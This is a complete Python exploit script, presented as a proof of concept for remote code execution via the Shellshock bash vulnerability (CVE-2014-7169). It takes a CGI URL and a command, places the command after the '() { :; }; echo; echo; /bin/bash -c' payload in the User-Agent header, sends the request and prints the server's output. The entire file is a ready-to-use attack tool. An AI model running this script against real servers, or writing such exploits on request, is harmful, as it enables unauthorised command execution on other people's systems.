#!/usr/bin/python3
#Simple RCE Proof-of-Concept for Shellshock vulnerability (CVE-2014-7169)
#Author: h0n3yb

import sys
import requests

def main(argv):

    print('CVE-2014-7169 Shellshock RCE PoC\n')
    if len(sys.argv) < 3: 
        print('Usage: ./exploit.py http://<TARGET>/cgi-bin/<VULNERABLE> <COMMAND>\n\nThere are 2 positional arguments:\n\ntarget\ncommand\n\nMake sure to put quotes around multi-word commands!')
        exit()
    else:
        target = argv[1]
        print('Target: ' + target)
        command = argv[2]
        print('Command: ' + command)
    
    badHeader = {'user-agent' : '() { :; }; echo; echo; /bin/bash -c ' + '\''+ str(command) + '\''}
    print('Header: ' + str(badHeader))
    try: 
        while True:
            try: 
                r = requests.get(target, headers=badHeader)
                raw = r.content
                out = raw.strip()
                print('\n[+] OUTPUT: ' + out.decode("utf-8"))
                break
            except:
                print('\n\n[!] Error: Target is down or not vulnerable')
                exit()
    except KeyboardInterrupt:
        exit()

if __name__ == "__main__":
    main(sys.argv)
